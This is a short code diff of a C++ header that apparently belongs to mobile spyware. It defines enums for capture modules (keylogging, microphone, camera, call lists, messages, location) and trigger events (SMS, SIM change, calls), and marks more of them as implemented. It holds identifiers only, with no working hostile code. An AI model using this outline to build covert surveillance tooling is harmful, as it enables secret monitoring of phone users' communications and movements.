@@ -36,17 +36,17 @@ enum TAgentType
 	EAgent			= 0x1000,
 	EAgent_Messages = 0x1001,				// ***
 	EAgent_Tasks_TODO = 0x1002,				// ***
-	EAgent_CallList = 0x1003,				
+	EAgent_CallList = 0x1003,				// ***
 	EAgent_Device = 0x1004,				// ***
 	EAgent_Position = 0x1005,				// ***
 	EAgent_Call_TODO,
 	EAgent_CallLocal,
-	EAgent_Keylog_TODO,
+	EAgent_Keylog = 0x1008,
 	EAgent_Snapshot = 0x1009,		// ***
 	EAgent_URL_TODO,
 	//EAgent_IM_TODO,
 	EAgent_Mic = 0x100D,			// ***
-	EAgent_Cam_TODO,
+	EAgent_Cam,
 	EAgent_Clipboard_TODO,
 	EAgent_Crisis_TODO,
 	EAgent_Application = 0x1011,     // ***
@@ -61,16 +61,16 @@ enum TEventType
 	EEvent			= 0x2000,
 	EEvent_Timer,					// ***
 	EEvent_Sms,						// ***
-	EEvent_Call,
-	EEvent_Connection,
-	EEvent_Process,
+	EEvent_Call,					// ***
+	EEvent_Connection,				// ***
+	EEvent_Process,					// ***
 	EEvent_CellID,					// ***
 	EEvent_Quota_TODO,
-	EEvent_Sim_Change,
+	EEvent_Sim_Change,				// ***
 	EEvent_Location,				// ***
-	EEvent_AC,
-	EEvent_Battery,
-	EEvent_Standby,
+	EEvent_AC,						// ***
+	EEvent_Battery,					// ***
+	EEvent_Standby,					// ***
 	EEvent_LAST_ID
 	};
 
@@ -132,3 +132,5 @@ public:
 
 
 #endif
+
+
